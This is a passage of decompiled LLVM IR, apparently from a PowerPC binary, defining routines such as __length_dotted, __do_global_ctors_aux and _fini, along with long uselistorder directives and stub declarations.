  uselistorder i32* @r23, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 12, 11, 0, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* @r24, { 3, 4, 7, 5, 6, 8, 9, 10, 0, 11, 12, 13, 14, 15, 2, 16, 17, 18, 1, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* @r6, { 15, 16, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 10, 11, 12, 17, 13, 14, 18 }
  uselistorder i32* @r25, { 10, 11, 12, 14, 15, 13, 16, 1, 2, 17, 18, 19, 20, 21, 22, 23, 24, 25, 30, 33, 3, 4, 26, 27, 28, 29, 0, 6, 7, 8, 9, 31, 32, 5 }
  uselistorder i32* @r26, { 1, 29, 30, 31, 32, 33, 34, 35, 38, 36, 37, 39, 40, 41, 42, 43, 3, 4, 44, 45, 46, 47, 49, 2, 50, 51, 53, 54, 55, 56, 57, 58, 59, 9, 10, 76, 5, 6, 7, 72, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 73, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 25, 26, 0, 74, 75, 52, 27, 28, 48, 8 }
  uselistorder i32 ()* @__asm_mfcr, { 28, 33, 27, 26, 12, 32, 20, 34, 9, 8, 7, 6, 5, 15, 41, 40, 25, 39, 31, 30, 10, 29, 11, 38, 23, 21, 37, 19, 3, 14, 18, 13, 36, 24, 17, 16, 35, 4, 2, 1, 0, 22 }
  uselistorder label %dec_label_pc_1000fcc8, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000fcb8, { 1, 0 }
  uselistorder label %dec_label_pc_1000fca0, { 1, 0 }
  uselistorder label %dec_label_pc_1000fc9c, { 1, 0 }
  uselistorder label %dec_label_pc_1000fc8c, { 1, 0 }
  uselistorder label %dec_label_pc_1000fc48, { 1, 0 }
  uselistorder label %dec_label_pc_1000fc30, { 1, 0 }
  uselistorder label %dec_label_pc_1000fc28, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v0_1000fce4 = load i32, i32* @r3, align 4
  store i32 %v0_1000fce4, i32* %r11.global-to-local, align 4
  %v3_1000fce4 = icmp eq i32 %v0_1000fce4, 0
  %v0_1000fcec = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000fce4, i32 %v0_1000fcec)
  %v0_1000fcfc = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000fd08

dec_label_pc_1000fcf4:                            ; preds = %dec_label_pc_1000fd04
  %v1_1000fcf4 = add i32 %v1_1000fd08, 2
  br label %dec_label_pc_1000fd24

dec_label_pc_1000fd04:                            ; preds = %dec_label_pc_1000fd08
  %v2_1000fd1c = add i32 %v1_1000fd0c, %v5_1000fd08
  %v3_1000fd18 = icmp eq i32 %v1_1000fd14, 192
  br i1 %v3_1000fd18, label %dec_label_pc_1000fcf4, label %dec_label_pc_1000fd08

dec_label_pc_1000fd08:                            ; preds = %dec_label_pc_1000fd04, %entry
  %v1_1000fd08 = phi i32 [ %v2_1000fd1c, %dec_label_pc_1000fd04 ], [ %v0_1000fcfc, %entry ]
  %v0_1000fd08 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000fd08 = add i32 %v0_1000fd08, %v1_1000fd08
  %v3_1000fd08 = inttoptr i32 %v2_1000fd08 to i8*
  %v4_1000fd08 = load i8, i8* %v3_1000fd08, align 1
  %v5_1000fd08 = zext i8 %v4_1000fd08 to i32
  %v1_1000fd0c = add i32 %v1_1000fd08, 1
  %v3_1000fd10 = icmp eq i8 %v4_1000fd08, 0
  %v1_1000fd14 = call i32 @__asm_rlwinm(i32 %v5_1000fd08, i32 0, i32 24, i32 25)
  br i1 %v3_1000fd10, label %dec_label_pc_1000fd24, label %dec_label_pc_1000fd04

dec_label_pc_1000fd24:                            ; preds = %dec_label_pc_1000fd08, %dec_label_pc_1000fcf4
  %v1_1000fd24 = phi i32 [ %v1_1000fcf4, %dec_label_pc_1000fcf4 ], [ %v1_1000fd0c, %dec_label_pc_1000fd08 ]
  %v0_1000fd24 = load i32, i32* @r4, align 4
  %v2_1000fd24 = sub i32 %v1_1000fd24, %v0_1000fd24
  ret i32 %v2_1000fd24

; uselistorder directives
  uselistorder i32 %v1_1000fd0c, { 1, 0 }
  uselistorder i32 %v5_1000fd08, { 1, 0 }
  uselistorder i32 %v1_1000fd08, { 2, 1, 0 }
  uselistorder i32 %v0_1000fce4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm, { 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 38, 6, 7, 8, 1, 52, 53, 2, 46, 3, 47, 0, 51, 4, 54, 55, 56, 9, 36, 37, 5, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 39, 40, 41, 42, 35, 50, 43, 44, 45, 48, 49, 57 }
  uselistorder i32 25, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 24, { 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 12, 36, 37, 45, 38, 39, 42, 13, 5, 47, 6, 14, 43, 40, 41, 15, 16, 17, 18, 19, 20, 21, 22, 23, 49, 50, 44, 7, 8, 9, 10, 11, 1, 2, 3, 4, 24, 25, 46, 0, 48 }
  uselistorder i8 0, { 37, 35, 4, 38, 2, 39, 40, 24, 44, 42, 23, 43, 41, 22, 45, 46, 47, 48, 5, 50, 49, 25, 6, 51, 52, 7, 53, 54, 21, 27, 57, 55, 56, 26, 58, 59, 8, 61, 60, 28, 62, 63, 0, 64, 65, 66, 9, 67, 10, 68, 11, 1, 12, 69, 70, 71, 73, 74, 75, 76, 72, 77, 13, 78, 79, 80, 81, 83, 84, 85, 86, 82, 87, 3, 14, 15, 16, 17, 18, 19, 88, 90, 89, 20, 91, 92, 93, 94, 95, 96, 98, 29, 99, 100, 97, 101, 102, 103, 104, 106, 105, 107, 108, 109, 110, 111, 113, 112, 114, 30, 116, 115, 36, 117, 31, 118, 120, 121, 119, 32, 122, 123, 34, 124, 33, 125, 126, 127, 128, 129, 130, 131 }
  uselistorder i32 192, { 1, 2, 0 }
  uselistorder i32 2, { 0, 4, 110, 49, 111, 112, 30, 1, 2, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 5, 125, 6, 87, 88, 89, 31, 29, 126, 127, 128, 129, 130, 50, 51, 52, 94, 95, 146, 42, 7, 8, 3, 53, 136, 9, 10, 32, 133, 134, 40, 96, 97, 11, 98, 99, 100, 54, 55, 90, 56, 91, 57, 92, 147, 33, 12, 13, 14, 47, 48, 58, 59, 137, 46, 149, 15, 16, 17, 18, 34, 35, 36, 37, 38, 60, 144, 145, 39, 131, 132, 101, 102, 103, 19, 20, 21, 22, 23, 104, 105, 24, 107, 108, 109, 28, 106, 135, 61, 25, 26, 148, 150, 62, 93, 64, 65, 63, 66, 43, 67, 68, 44, 70, 71, 69, 72, 74, 73, 75, 76, 77, 78, 79, 138, 139, 140, 141, 80, 41, 142, 81, 82, 83, 84, 85, 143, 45, 27, 86 }
  uselistorder i32* @r4, { 80, 81, 1, 82, 83, 84, 85, 2, 86, 87, 88, 89, 9, 10, 90, 91, 92, 93, 94, 95, 96, 97, 98, 121, 118, 119, 99, 100, 101, 102, 103, 6, 104, 105, 106, 115, 116, 45, 11, 54, 55, 56, 57, 58, 59, 60, 61, 131, 7, 8, 15, 16, 123, 28, 29, 14, 78, 79, 17, 18, 120, 19, 12, 107, 108, 114, 117, 124, 125, 126, 3, 62, 63, 64, 13, 65, 66, 109, 110, 111, 112, 113, 4, 130, 67, 68, 69, 70, 0, 71, 72, 73, 122, 74, 75, 76, 5, 20, 21, 127, 128, 129, 22, 23, 24, 25, 26, 27, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 47, 48, 49, 50, 51, 52, 53, 77 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 10, 11, 13, 14, 15, 16, 17, 18, 1, 29, 31, 26, 2, 3, 4, 5, 6, 7, 30, 25, 21, 22, 23, 24, 8, 19, 20, 12, 33, 32, 9, 27, 0, 28 }
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10023954.633 to i32), i32* %r31.global-to-local, align 4
  %v3_1000fd48 = load i32, i32* @global_var_10023954.633, align 4
  %v3_1000fd4c = icmp eq i32 %v3_1000fd48, -1
  br i1 %v3_1000fd4c, label %dec_label_pc_1000fd68, label %dec_label_pc_1000fd54

dec_label_pc_1000fd54:                            ; preds = %entry, %dec_label_pc_1000fd54
  %v0_1000fd54 = phi i32 [ %v3_1000fd5c, %dec_label_pc_1000fd54 ], [ %v3_1000fd48, %entry ]
  call void @__pseudo_call(i32 %v0_1000fd54)
  %v0_1000fd5c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000fd5c = add i32 %v0_1000fd5c, -4
  %v2_1000fd5c = inttoptr i32 %v1_1000fd5c to i32*
  %v3_1000fd5c = load i32, i32* %v2_1000fd5c, align 4
  store i32 %v1_1000fd5c, i32* %r31.global-to-local, align 4
  %v3_1000fd60 = icmp eq i32 %v3_1000fd5c, -1
  br i1 %v3_1000fd60, label %dec_label_pc_1000fd68, label %dec_label_pc_1000fd54

dec_label_pc_1000fd68:                            ; preds = %dec_label_pc_1000fd54, %entry
  %v0_1000fd78 = load i32, i32* @r3, align 4
  ret i32 %v0_1000fd78

; uselistorder directives
  uselistorder i32 %v3_1000fd5c, { 1, 0 }
  uselistorder i32 -4, { 28, 12, 13, 14, 21, 22, 23, 24, 25, 15, 16, 2, 3, 4, 5, 6, 7, 8, 9, 10, 27, 26, 32, 33, 29, 30, 31, 17, 18, 19, 20, 0, 11, 1 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 3, 4, 0 }
  uselistorder i32 -1, { 358, 359, 16, 47, 59, 295, 296, 252, 127, 297, 60, 298, 51, 61, 299, 62, 300, 223, 224, 110, 111, 64, 63, 225, 48, 49, 226, 227, 228, 185, 70, 68, 66, 229, 230, 231, 69, 67, 65, 232, 233, 186, 234, 187, 301, 25, 26, 188, 302, 189, 52, 303, 71, 253, 128, 3, 4, 254, 255, 53, 256, 257, 72, 73, 190, 360, 29, 30, 31, 361, 191, 365, 27, 28, 305, 32, 315, 316, 317, 131, 318, 319, 320, 321, 322, 323, 324, 129, 325, 130, 326, 327, 328, 329, 192, 258, 193, 54, 5, 194, 259, 260, 195, 196, 197, 261, 198, 330, 331, 33, 34, 35, 199, 332, 333, 200, 306, 310, 311, 50, 262, 263, 264, 119, 55, 265, 266, 267, 268, 132, 269, 6, 74, 270, 271, 272, 273, 274, 201, 275, 133, 343, 344, 134, 7, 8, 135, 56, 276, 202, 203, 277, 278, 279, 280, 75, 76, 348, 136, 77, 78, 79, 80, 81, 82, 83, 0, 368, 366, 84, 238, 239, 137, 204, 240, 38, 39, 205, 241, 36, 37, 206, 250, 9, 138, 235, 10, 85, 57, 293, 40, 41, 207, 139, 112, 294, 86, 236, 349, 350, 46, 237, 364, 242, 87, 243, 208, 244, 42, 43, 245, 246, 347, 58, 209, 334, 113, 335, 336, 140, 340, 88, 345, 369, 370, 281, 341, 89, 210, 211, 337, 338, 212, 339, 117, 213, 214, 215, 216, 217, 44, 218, 141, 90, 312, 114, 307, 309, 308, 17, 18, 19, 20, 21, 22, 23, 115, 116, 282, 15, 283, 11, 284, 285, 219, 142, 24, 220, 286, 287, 1, 289, 290, 2, 143, 144, 221, 45, 145, 120, 291, 146, 288, 313, 12, 13, 292, 147, 314, 148, 304, 149, 91, 92, 93, 362, 363, 94, 95, 96, 97, 98, 99, 100, 101, 102, 247, 103, 104, 105, 106, 107, 108, 367, 109, 371, 150, 183, 248, 249, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 121, 161, 162, 163, 251, 164, 165, 166, 167, 168, 14, 169, 170, 342, 184, 222, 171, 172, 173, 174, 346, 175, 118, 176, 122, 123, 124, 125, 126, 177, 178, 351, 352, 353, 179, 354, 355, 356, 357, 180, 181, 182 }
  uselistorder i32 1, {}
  uselistorder label %dec_label_pc_1000fd54, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v0_1000fd94 = load i32, i32* @r3, align 4
  ret i32 %v0_1000fd94

; uselistorder directives
  uselistorder i32* @r3, { 19, 20, 166, 167, 170, 168, 169, 0, 171, 10, 172, 53, 54, 55, 173, 176, 177, 47, 178, 21, 11, 93, 94, 12, 22, 111, 112, 113, 259, 271, 268, 269, 179, 187, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 13, 225, 226, 227, 228, 229, 230, 231, 232, 233, 95, 96, 14, 97, 98, 99, 23, 114, 115, 116, 117, 118, 15, 234, 42, 24, 119, 120, 121, 122, 123, 124, 2, 1, 125, 126, 127, 25, 272, 50, 284, 26, 43, 27, 3, 41, 61, 62, 49, 278, 279, 280, 156, 157, 158, 159, 160, 161, 162, 163, 56, 57, 58, 59, 60, 248, 249, 63, 44, 64, 18, 28, 260, 261, 270, 65, 235, 236, 237, 238, 239, 240, 241, 242, 29, 30, 31, 32, 281, 282, 4, 128, 129, 130, 131, 266, 174, 175, 16, 33, 283, 34, 193, 194, 195, 196, 197, 198, 199, 35, 188, 189, 190, 191, 192, 66, 67, 200, 201, 68, 69, 132, 36, 133, 134, 135, 5, 9, 6, 136, 7, 137, 8, 138, 139, 140, 141, 142, 143, 37, 144, 145, 146, 147, 148, 149, 52, 273, 274, 275, 276, 277, 202, 203, 204, 205, 206, 207, 208, 209, 150, 151, 152, 180, 181, 182, 183, 184, 185, 186, 70, 71, 38, 72, 73, 74, 75, 76, 78, 77, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 153, 154, 155, 51, 164, 165, 243, 244, 245, 246, 247, 250, 17, 251, 252, 253, 254, 255, 256, 257, 45, 258, 46, 262, 263, 264, 265, 267, 39, 40, 48 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  store i32 268500392, i32* @lr, align 4
  %v0_1000fda4 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_1000fda4

; uselistorder directives
  uselistorder i32 0, { 1063, 1064, 36, 1067, 119, 1065, 1066, 60, 1068, 1069, 1070, 1073, 1071, 0, 1072, 1074, 25, 870, 871, 1090, 1077, 1080, 1081, 1082, 319, 1083, 1084, 1086, 1085, 1087, 1088, 1089, 1091, 1092, 1093, 1075, 1076, 1078, 1079, 120, 1094, 1096, 1097, 1095, 1098, 1099, 1100, 1101, 236, 702, 1102, 237, 703, 704, 121, 122, 713, 714, 97, 715, 716, 717, 718, 719, 720, 721, 123, 182, 723, 722, 124, 724, 725, 126, 125, 726, 320, 727, 728, 729, 128, 127, 730, 731, 246, 321, 732, 129, 1103, 1104, 1105, 1106, 1112, 1107, 64, 1113, 1114, 1108, 1109, 1110, 61, 62, 63, 1115, 322, 37, 38, 39, 224, 1117, 130, 1116, 323, 1118, 1119, 1120, 1121, 131, 1122, 98, 40, 1123, 183, 1124, 1125, 1126, 847, 184, 872, 873, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 874, 26, 875, 133, 132, 876, 877, 878, 879, 134, 1134, 1135, 1136, 1137, 880, 881, 882, 883, 884, 885, 886, 887, 27, 1138, 1354, 324, 1357, 67, 325, 247, 1358, 326, 1361, 1362, 65, 66, 1363, 1355, 1356, 327, 328, 1152, 1145, 329, 68, 1146, 1147, 1148, 41, 1150, 1151, 1175, 1176, 1196, 1197, 1198, 1199, 248, 234, 235, 331, 1200, 1201, 1202, 1204, 185, 1207, 332, 249, 1209, 1210, 1211, 1212, 330, 250, 1206, 1203, 1205, 1208, 1213, 238, 1214, 1215, 1216, 1, 1282, 1283, 1284, 136, 135, 1285, 2, 137, 251, 848, 849, 850, 3, 888, 889, 187, 891, 890, 57, 4, 892, 186, 5, 893, 189, 894, 58, 6, 895, 188, 1217, 1218, 69, 1219, 1220, 1221, 1222, 1223, 1153, 1154, 1169, 333, 1170, 1171, 1172, 896, 897, 898, 899, 900, 334, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 138, 139, 914, 915, 916, 917, 918, 919, 920, 921, 922, 42, 923, 335, 93, 924, 925, 926, 927, 928, 140, 929, 930, 931, 932, 933, 934, 935, 936, 1269, 1270, 141, 1271, 1272, 1273, 306, 307, 1274, 1275, 1276, 28, 7, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 99, 1364, 1365, 1366, 1369, 1367, 8, 190, 957, 956, 191, 955, 100, 958, 959, 960, 142, 961, 1293, 1307, 1308, 252, 1309, 863, 1370, 1371, 1372, 1373, 1374, 1310, 336, 337, 338, 1390, 1391, 339, 1396, 1416, 192, 1417, 340, 341, 1408, 9, 1375, 1376, 253, 143, 742, 743, 342, 254, 343, 744, 745, 72, 73, 746, 747, 748, 344, 749, 750, 751, 70, 71, 752, 753, 1377, 1378, 1379, 1380, 1381, 1382, 144, 345, 1389, 806, 807, 808, 809, 810, 145, 811, 812, 813, 308, 814, 346, 815, 347, 733, 734, 735, 146, 736, 147, 1056, 1057, 193, 101, 118, 1058, 1059, 10, 1244, 737, 738, 148, 739, 740, 741, 1313, 1315, 43, 1316, 74, 1317, 1314, 1311, 1312, 11, 758, 754, 755, 756, 757, 194, 12, 1320, 1318, 1319, 195, 1321, 1322, 759, 760, 761, 762, 763, 348, 764, 765, 1323, 1324, 349, 1325, 149, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 1333, 13, 14, 705, 766, 767, 768, 75, 76, 769, 15, 350, 309, 310, 351, 1224, 1225, 196, 1226, 1227, 1228, 1229, 1235, 1236, 1237, 1238, 150, 1239, 1240, 1286, 1277, 255, 352, 1397, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 353, 1405, 16, 17, 1264, 151, 152, 962, 963, 29, 30, 256, 31, 964, 197, 18, 1245, 1246, 1247, 77, 965, 966, 198, 354, 967, 1230, 1231, 1232, 1233, 1234, 1346, 1347, 199, 1149, 19, 92, 1111, 200, 1418, 1419, 1420, 1421, 1422, 1423, 1424, 1425, 1409, 1410, 1411, 78, 1412, 1413, 1414, 1415, 153, 968, 969, 970, 971, 972, 973, 154, 1173, 1155, 1156, 1157, 1158, 1159, 1166, 1162, 1163, 1164, 1165, 201, 1167, 1168, 1160, 20, 79, 1161, 770, 1174, 771, 772, 974, 975, 102, 976, 977, 978, 979, 980, 239, 981, 982, 983, 155, 984, 985, 986, 987, 988, 156, 989, 990, 991, 992, 993, 994, 995, 157, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 44, 174, 175, 202, 1007, 1008, 158, 1009, 355, 1010, 1011, 356, 1014, 163, 159, 1012, 1013, 358, 1015, 1016, 1017, 1019, 164, 1020, 21, 22, 165, 166, 160, 161, 1021, 1022, 162, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 357, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 706, 1042, 1043, 32, 1045, 80, 103, 167, 359, 1048, 311, 1049, 1044, 1046, 1047, 1050, 1051, 168, 709, 710, 94, 59, 86, 1018, 203, 1384, 1386, 1385, 205, 169, 1388, 1387, 204, 257, 1177, 1178, 1179, 170, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 360, 1189, 1190, 1191, 1192, 1193, 1194, 240, 1052, 1053, 361, 1195, 1139, 1140, 1141, 1142, 1143, 1144, 1348, 1368, 362, 1060, 1359, 1360, 773, 1278, 1291, 774, 1297, 1392, 171, 1393, 1352, 1298, 1353, 775, 1299, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 1256, 1300, 1301, 786, 1383, 1394, 1395, 1406, 1407, 243, 364, 365, 206, 787, 368, 34, 35, 369, 788, 789, 377, 378, 459, 460, 33, 45, 241, 363, 707, 366, 242, 367, 790, 207, 104, 370, 791, 792, 793, 794, 796, 225, 795, 797, 798, 373, 374, 371, 372, 799, 375, 376, 260, 259, 258, 261, 208, 801, 379, 800, 382, 383, 380, 381, 802, 384, 803, 385, 804, 386, 805, 387, 46, 87, 105, 106, 107, 244, 391, 262, 172, 816, 817, 396, 818, 820, 390, 397, 819, 211, 821, 822, 823, 394, 824, 826, 389, 395, 825, 210, 827, 393, 828, 829, 830, 398, 831, 833, 388, 399, 832, 209, 834, 392, 835, 836, 837, 838, 839, 400, 840, 841, 842, 401, 843, 844, 845, 846, 108, 403, 265, 266, 263, 404, 856, 402, 851, 852, 853, 854, 855, 212, 857, 858, 405, 312, 859, 264, 860, 861, 862, 109, 177, 408, 270, 269, 228, 226, 227, 409, 91, 313, 864, 410, 407, 268, 865, 176, 411, 267, 231, 229, 230, 412, 406, 866, 867, 868, 869, 173, 413, 1054, 214, 1055, 213, 178, 414, 271, 416, 417, 418, 415, 419, 420, 421, 422, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 1061, 47, 1062, 272, 423, 424, 425, 426, 427, 428, 429, 48, 179, 440, 441, 442, 443, 273, 274, 275, 1241, 314, 1242, 245, 1243, 81, 88, 89, 96, 95, 49, 50, 444, 276, 277, 278, 279, 1255, 1249, 1251, 1252, 1253, 446, 1254, 447, 281, 280, 445, 82, 1248, 1250, 51, 110, 216, 215, 23, 24, 708, 448, 1257, 282, 283, 284, 285, 1258, 1259, 286, 287, 449, 83, 1260, 111, 90, 1265, 217, 180, 1266, 288, 1261, 1262, 450, 451, 452, 1263, 315, 454, 1267, 290, 289, 453, 84, 455, 1268, 291, 1279, 232, 458, 1280, 294, 457, 85, 1281, 293, 456, 218, 292, 52, 181, 1287, 1288, 316, 1289, 1290, 112, 53, 317, 1292, 219, 1294, 461, 462, 463, 295, 1295, 1296, 296, 464, 1302, 1303, 465, 1304, 1305, 1306, 466, 113, 299, 297, 298, 467, 468, 1345, 114, 54, 233, 220, 302, 303, 1334, 1335, 1336, 1337, 221, 300, 301, 304, 1338, 1339, 1340, 223, 55, 115, 116, 222, 1342, 1343, 1344, 318, 117, 56, 1341, 1349, 1350, 305, 1426, 1427, 1428, 1351, 711, 712, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 1429, 1430, 1431, 1432, 1433, 1434, 1435, 1436, 1437, 1438, 1439, 1440, 1441, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 1452 }
  uselistorder i32* @lr, { 11, 301, 302, 303, 304, 305, 306, 211, 544, 545, 546, 307, 311, 308, 309, 310, 315, 316, 312, 313, 314, 317, 318, 319, 320, 321, 12, 13, 14, 17, 15, 16, 322, 326, 323, 1, 325, 0, 327, 330, 331, 328, 329, 332, 333, 334, 335, 336, 337, 338, 339, 173, 212, 213, 340, 341, 342, 343, 214, 215, 216, 217, 521, 551, 552, 553, 554, 547, 548, 549, 550, 344, 349, 364, 350, 351, 352, 365, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 484, 174, 175, 176, 177, 218, 219, 220, 555, 221, 222, 353, 354, 359, 360, 361, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 556, 557, 235, 236, 522, 523, 566, 567, 571, 572, 573, 574, 575, 588, 590, 592, 568, 570, 190, 23, 24, 25, 26, 27, 28, 29, 558, 564, 565, 18, 19, 293, 21, 294, 20, 22, 524, 526, 525, 30, 31, 32, 33, 34, 35, 527, 528, 529, 530, 531, 532, 36, 495, 405, 406, 191, 533, 477, 453, 91, 454, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 420, 421, 422, 423, 485, 475, 576, 577, 578, 579, 580, 583, 584, 585, 466, 237, 238, 239, 441, 442, 443, 444, 240, 418, 419, 324, 591, 589, 241, 242, 243, 362, 355, 357, 358, 356, 37, 363, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 9, 10, 258, 559, 560, 561, 562, 563, 586, 587, 366, 367, 368, 369, 370, 371, 372, 373, 272, 273, 274, 345, 346, 347, 348, 487, 38, 504, 39, 40, 41, 42, 569, 505, 581, 582, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 69, 68, 70, 71, 72, 73, 74, 75, 76, 77, 79, 78, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 278, 275, 276, 277, 2, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 3, 4, 5, 6, 7, 8, 295, 296, 297, 298, 299, 300, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 445, 446, 447, 448, 449, 467, 468, 469, 450, 451, 452, 455, 456, 457, 458, 459, 460, 461, 470, 462, 463, 464, 465, 471, 472, 473, 474, 476, 478, 479, 480, 481, 482, 483, 486, 488, 489, 490, 491, 492, 493, 494, 496, 497, 498, 499, 500, 501, 502, 503, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 534, 535, 536, 537, 538, 539, 541, 540, 542, 543 }
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_mfcr() local_unnamed_addr

declare %0 @__asm_mtcrf(i32, i32) local_unnamed_addr

declare %2 @__asm_mcrf_cr0_write(i4) local_unnamed_addr

declare %1 @__asm_cror(i32, i32, i32) local_unnamed_addr

declare i32 @unknown_0(i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr
